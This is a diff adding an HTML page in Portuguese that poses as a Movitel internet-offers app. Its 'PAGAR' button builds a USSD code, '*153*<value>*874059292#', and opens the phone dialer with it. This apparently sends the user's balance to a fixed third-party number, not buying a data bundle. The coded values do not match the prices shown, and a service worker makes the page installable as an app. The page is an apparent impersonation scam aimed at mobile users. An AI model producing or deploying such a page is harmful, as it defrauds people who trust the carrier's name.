@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Movitel Ofertas</title>
+
+<link rel="manifest" href="manifest.json">
+
+<style>
+body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background: #f4f4f4;
+}
+
+.header {
+    background: #0a7dbd;
+    color: white;
+    text-align: center;
+    padding: 15px;
+    font-weight: bold;
+}
+
+.container {
+    padding: 15px;
+}
+
+.alert {
+    color: #ff6a00;
+    text-align: center;
+    font-size: 14px;
+    margin-bottom: 15px;
+}
+
+.select {
+    border: 2px solid #ff6a00;
+    border-radius: 10px;
+    padding: 12px;
+    background: #fff;
+    margin-bottom: 15px;
+    font-weight: bold;
+}
+
+.offer {
+    background: #ff6a00;
+    color: #fff;
+    padding: 15px;
+    border-radius: 10px;
+    margin-bottom: 12px;
+    display: flex;
+    align-items: center;
+}
+
+.offer input {
+    margin-right: 10px;
+    transform: scale(1.3);
+}
+
+button {
+    width: 100%;
+    padding: 15px;
+    border-radius: 10px;
+    border: none;
+    font-size: 18px;
+    background: #ddd;
+    font-weight: bold;
+}
+</style>
+</head>
+
+<body>
+
+<div class="header">
+    AVISO: Usa Dados Móveis para Abrir Este App
+</div>
+
+<div class="container">
+
+    <div class="alert">
+        Olá!<br>
+        ▶ Selecione uma opção abaixo e clique pagar.<br>
+        ▶ NB: Deve ter saldo disponível.
+    </div>
+
+    <div class="select">OFERTAS DE INTERNET</div>
+
+    <label class="offer">
+        <input type="radio" name="pacote" value="40">
+        200MT = 8.9GB / (7h)
+    </label>
+
+    <label class="offer">
+        <input type="radio" name="pacote" value="70">
+        50MT = 3GB / 30 Dias
+    </label>
+
+    <label class="offer">
+        <input type="radio" name="pacote" value="100">
+        100MT = 5.9GB / 30 Dias
+    </label>
+
+    <label class="offer">
+        <input type="radio" name="pacote" value="20">
+        30MT = 2.9GB
+    </label>
+
+    <button onclick="pagar()">PAGAR</button>
+
+</div>
+
+<script>
+function pagar() {
+    const pacote = document.querySelector('input[name="pacote"]:checked');
+
+    if (!pacote) {
+        alert("Selecione uma oferta primeiro.");
+        return;
+    }
+
+    const valor = pacote.value;
+
+    // Código USSD automático
+    const ussd = "*153*" + valor + "*874059292" + "#";
+
+    // Abre o discador
+    window.location.href = "tel:" + encodeURIComponent(ussd);
+}
+
+// PWA
+if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('service-worker.js');
+}
+</script>
+
+</body>
+</html>
